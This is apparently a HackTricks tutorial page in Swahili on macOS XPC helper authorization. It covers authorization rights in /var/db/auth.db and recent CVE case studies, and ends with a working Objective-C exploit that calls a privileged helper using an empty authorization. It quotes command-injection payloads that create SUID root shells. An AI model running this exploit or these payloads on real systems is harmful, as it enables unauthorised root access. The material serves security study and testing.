# XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple pia inapendekeza njia nyingine ya kuthibitisha ikiwa mchakato unaounganisha una **ruhusa za kuita exposed XPC method**.

Wakati application inahitaji **kutekeleza vitendo kama mtumiaji mwenye privileged access**, badala ya kuendesha app kama mtumiaji mwenye privileged access, kwa kawaida hu-install kama root HelperTool kama XPC service ambayo inaweza kuitwa kutoka kwenye app ili kutekeleza vitendo hivyo. Hata hivyo, app inayoiita service hiyo inapaswa kuwa na authorization ya kutosha.

### ShouldAcceptNewConnection always YES

Mfano unaweza kupatikana katika [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Katika `App/AppDelegate.m`, inajaribu **kuunganisha** na **HelperTool**. Na katika `HelperTool/HelperTool.m`, function **`shouldAcceptNewConnection`** **haitakagua** mahitaji yoyote yaliyoonyeshwa hapo awali. Daima itarudisha YES:<sup>[1]</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Kwa maelezo zaidi kuhusu jinsi ya kusanidi check hii ipasavyo:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Haki za application

Hata hivyo, kuna **authorization inayofanyika wakati method kutoka kwa HelperTool inapoitwa**.

Function **`applicationDidFinishLaunching`** kutoka `App/AppDelegate.m` itaunda authorization reference tupu baada ya app kuanza. Hii inapaswa kufanya kazi kila wakati.\
Kisha, itajaribu **kuongeza baadhi ya haki** kwenye authorization reference hiyo kwa kuita `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Kazi `setupAuthorizationRights` kutoka `Common/Common.m` itahifadhi kwenye auth database `/var/db/auth.db` haki za application. Angalia kwamba itaongeza tu haki ambazo bado hazipo kwenye database:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Kazi ya `enumerateRightsUsingBlock` ndiyo inayotumika kupata permissions za applications, ambazo zimefafanuliwa katika `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Hii inamaanisha kwamba mwishoni mwa mchakato huu, permissions zilizotangazwa ndani ya `commandInfo` zitahifadhiwa katika `/var/db/auth.db`. Zingatia kwamba hapo unaweza kupata kwa **kila method** itakayo **require authentication**, **jina la permission** na **`kCommandKeyAuthRightDefault`**. Hiki cha mwisho **kinaonyesha ni nani anayeweza kupata ruhusa hii**.

Kuna scopes tofauti za kuonyesha ni nani anayeweza kufikia ruhusa fulani. Baadhi yake zimefafanuliwa katika [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (unaweza kupata [zote hapa](https://www.dssw.co.uk/reference/authorization-rights/)), lakini kwa muhtasari:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Mtu yeyote</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Hakuna mtu</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Mtumiaji wa sasa anahitaji kuwa admin (ndani ya admin group)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Muombe mtumiaji a-authenticate.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Muombe mtumiaji a-authenticate. Anahitaji kuwa admin (ndani ya admin group)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specify rules</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specify some extra comments on the right</td></tr></tbody></table>

### Uthibitishaji wa Ruhusa

Katika `HelperTool/HelperTool.m`, function **`readLicenseKeyAuthorization`** hukagua ikiwa caller ameidhinishwa **kutekeleza method hiyo** kwa kuita function **`checkAuthorization`**. Function hii itakagua ikiwa **authData** iliyotumwa na calling process ina **format sahihi**, kisha itaangalia **kinachohitajika ili kupata ruhusa** ya kuita method maalum. Ikiwa kila kitu kitaenda vizuri, **`error` itakayerudishwa itakuwa `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Kumbuka kwamba ili **kukagua mahitaji ya kupata** haki ya kuita method hiyo, function `authorizationRightForCommand` itakagua tu object **`commandInfo`** iliyotajwa hapo awali. Kisha, itaita **`AuthorizationCopyRights`** kukagua **ikiwa ina haki** za kuita function hiyo (kumbuka kwamba flags zinaruhusu mwingiliano na mtumiaji).

Katika hali hii, ili kuita function `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` imefafanuliwa kuwa `@kAuthorizationRuleClassAllow`. Kwa hiyo **mtu yeyote anaweza kuiita**.

### Taarifa za DB

Ilitajwa kwamba taarifa hii imehifadhiwa katika `/var/db/auth.db`. Unaweza kuorodhesha rules zote zilizohifadhiwa kwa:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Kisha, unaweza kusoma ni nani anayeweza kufikia haki hiyo kwa:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Ruhusa zinazoruhusu

Unaweza kupata **mipangilio yote ya permissions** [**hapa**](https://www.dssw.co.uk/reference/authorization-rights/), lakini michanganyiko ambayo haitahitaji mwingiliano wa mtumiaji ni:

1. **'authenticate-user': 'false'**
- Hii ndiyo key ya moja kwa moja zaidi. Ikiwekwa kuwa `false`, inaashiria kwamba mtumiaji hahitaji kutoa authentication ili kupata right hii.
- Hii hutumika **pamoja na mojawapo ya 2 zilizo hapa chini au kuonyesha group** ambalo mtumiaji lazima awe mwanachama wake.
2. **'allow-root': 'true'**
- Ikiwa mtumiaji anafanya kazi kama root user (ambaye ana permissions zilizoinuliwa), na key hii imewekwa kuwa `true`, root user anaweza kupata right hii bila authentication ya ziada. Hata hivyo, kwa kawaida, kufikia hali ya root user tayari huhitaji authentication, kwa hiyo hii si hali ya "no authentication" kwa watumiaji wengi.
3. **'session-owner': 'true'**
- Ikiwekwa kuwa `true`, mmiliki wa session (mtumiaji aliyeingia kwa sasa) atapata right hii moja kwa moja. Hii inaweza kupita authentication ya ziada ikiwa mtumiaji tayari ameingia.
4. **'shared': 'true'**
- Key hii haitoi rights bila authentication. Badala yake, ikiwekwa kuwa `true`, inamaanisha kwamba right ikishapata authentication, inaweza kushirikiwa kati ya processes nyingi bila kila process kuhitaji kufanya authentication tena. Hata hivyo, utoaji wa awali wa right bado utahitaji authentication isipokuwa iwe pamoja na keys nyingine kama **'authenticate-user': 'false'**.

Unaweza [**kutumia script hii**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kupata rights zinazovutia:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Uchunguzi wa Kesi za Authorization Bypass

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Mach service yenye privileged `com.acustica.HelperTool` inakubali kila connection, na routine yake ya `checkAuthorization:` inaita `AuthorizationCopyRights(NULL, …)`, hivyo blob yoyote yenye ukubwa wa baiti 32 hupita. Kisha `executeCommand:authorization:withReply:` huingiza strings zinazodhibitiwa na attacker na kutenganishwa kwa koma kwenye `NSTask` ikiwa root, na kufanya payloads kama:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
unda kwa urahisi shell ya SUID root. Maelezo katika [hii write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[6]</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Listener daima hurudisha YES na pattern ileile ya NULL `AuthorizationCopyRights` inaonekana katika `checkAuthorization:`. Method `exchangeAppWithReply:` huunganisha input ya attacker kwenye string ya `system()` mara mbili, hivyo kuingiza shell metacharacters katika `appPath` (kwa mfano, `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) huwezesha root code execution kupitia Mach service `com.plugin-alliance.pa-installationhelper`. Maelezo zaidi [hapa](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[7]</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Kuendesha audit huacha `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, hufichua Mach service `com.jamf.complianceeditor.helper`, na hu-export `-executeScriptAt:arguments:then:` bila kuthibitisha `AuthorizationExternalForm` au code signature ya caller. Exploit rahisi huunda reference tupu kwa `AuthorizationCreate`, huunganisha kwa `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, na kuita method hiyo ili kutekeleza arbitrary binaries kama root. Reversing notes kamili (pamoja na PoC) zinapatikana katika [write-up ya Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[4]</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 na 7.4.0–7.4.2 zilikubali crafted XPC messages zilizofikia privileged helper isiyokuwa na authorization gates. Kwa kuwa helper iliitegemea `AuthorizationRef` yake yenyewe yenye privileges, local user yeyote aliyeweza kutuma messages kwenye service angeweza kuilazimisha itekeleze arbitrary configuration changes au commands kama root. Maelezo katika [muhtasari wa ushauri wa SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[5]</sup>

#### Vidokezo vya rapid triage

- App inapotoa GUI na helper kwa pamoja, linganisha code requirements zao na uangalie kama `shouldAcceptNewConnection` inafunga listener kwa `-setCodeSigningRequirement:` (au inathibitisha `SecCodeCopySigningInformation`). Ukosefu wa checks kwa kawaida husababisha scenarios za CWE-863 kama katika kesi ya Jamf. Ukaguzi wa haraka unaonekana hivi:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Linganisha kile helper *inachodhani* inakioridhisha na kile client inachowasilisha. Wakati wa reversing, weka breakpoint kwenye `AuthorizationCopyRights` na uthibitishe kuwa `AuthorizationRef` inatoka kwenye `AuthorizationCreateFromExternalForm` (iliyotolewa na client) badala ya context yenye privileged ya helper yenyewe; vinginevyo huenda umebaini pattern ya CWE-863 inayofanana na kesi zilizo hapo juu.

## Reversing Authorization

### Kuangalia kama EvenBetterAuthorization inatumika

Ukipata function: **`[HelperTool checkAuthorization:command:]`**, huenda process inatumia schema iliyotajwa awali ya authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Hii, ikiwa function hii inaita functions kama `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, inatumia [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Kagua **`/var/db/auth.db`** ili kuona kama inawezekana kupata ruhusa za kuita kitendo fulani cha privileged bila mwingiliano wa mtumiaji.

### Mawasiliano ya Protocol

Kisha, unahitaji kupata schema ya protocol ili uweze kuanzisha mawasiliano na XPC service.

Function **`shouldAcceptNewConnection`** inaonyesha protocol inayotolewa:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Katika hali hii, tuna kitu kilekile kama kwenye EvenBetterAuthorizationSample, [**angalia mstari huu**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Kwa kujua jina la protocol inayotumika, inawezekana **kudump definition ya header yake** kwa:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Mwisho, tunahitaji tu kujua **jina la Mach Service iliyo exposed** ili kuanzisha mawasiliano nayo. Kuna njia kadhaa za kuipata:

- Katika **`[HelperTool init]`**, ambapo unaweza kuona Mach Service inayotumika:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Katika launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Mfano wa Exploit

Katika mfano huu imeundwa:

- Ufafanuzi wa protocol pamoja na functions
- auth tupu ya kutumia kuomba access
- Connection kwenye XPC service
- Wito wa function ikiwa connection ilifanikiwa
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Wasaidizi wengine wa XPC wa privilege waliotumiwa vibaya

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>

## Marejeleo

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror kwenye GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor Privilege Escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac Privilege Escalation Flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Acustica Audio HelperTool XPC Service Local Privilege Escalation in Aquarius Desktop kwenye macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service Local Privilege Escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework Privilege Escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
